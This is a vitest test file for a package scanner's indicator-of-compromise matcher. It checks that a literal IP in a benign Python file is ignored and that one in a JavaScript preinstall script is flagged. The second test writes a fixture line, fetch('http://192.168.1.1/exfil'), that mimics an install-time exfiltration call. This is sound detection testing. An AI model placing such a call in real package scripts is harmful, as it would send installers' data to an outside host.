import { mkdtemp, rm, writeFile } from "node:fs/promises";
import { join } from "node:path";
import { tmpdir } from "node:os";

import { describe, expect, it } from "vitest";

import { IOCMatcher } from "../src/subsystems/ioc-matcher/index.js";
import type { PackageMetadata } from "../src/core/types.js";

function makeMetadata(ecosystem: PackageMetadata["ecosystem"]): PackageMetadata {
  return {
    ecosystem,
    name: ecosystem === "pypi" ? "requests" : "sample",
    version: "1.0.0",
    packageSpec: "sample",
    maintainers: [],
    dependencies: {},
    installScripts: {},
    manifest: {}
  };
}

describe("IOCMatcher", () => {
  it("does not treat literal IPs in benign python files as IOC matches", async () => {
    const workspace = await mkdtemp(join(tmpdir(), "husk-ioc-"));
    try {
      await writeFile(join(workspace, "utils.py"), "SERVER = '192.168.1.1'\n", "utf8");
      const matcher = new IOCMatcher();
      const matches = await matcher.match(workspace, makeMetadata("pypi"));

      expect(matches.some((match) => match.description === "Literal IP address embedded in package source")).toBe(false);
    } finally {
      await rm(workspace, { recursive: true, force: true });
    }
  });

  it("still flags literal IPs inside JavaScript payloads", async () => {
    const workspace = await mkdtemp(join(tmpdir(), "husk-ioc-"));
    try {
      await writeFile(join(workspace, "preinstall.js"), "fetch('http://192.168.1.1/exfil')\n", "utf8");
      const matcher = new IOCMatcher();
      const matches = await matcher.match(workspace, makeMetadata("npm"));

      expect(matches.some((match) => match.description === "Literal IP address embedded in package source")).toBe(true);
    } finally {
      await rm(workspace, { recursive: true, force: true });
    }
  });
});
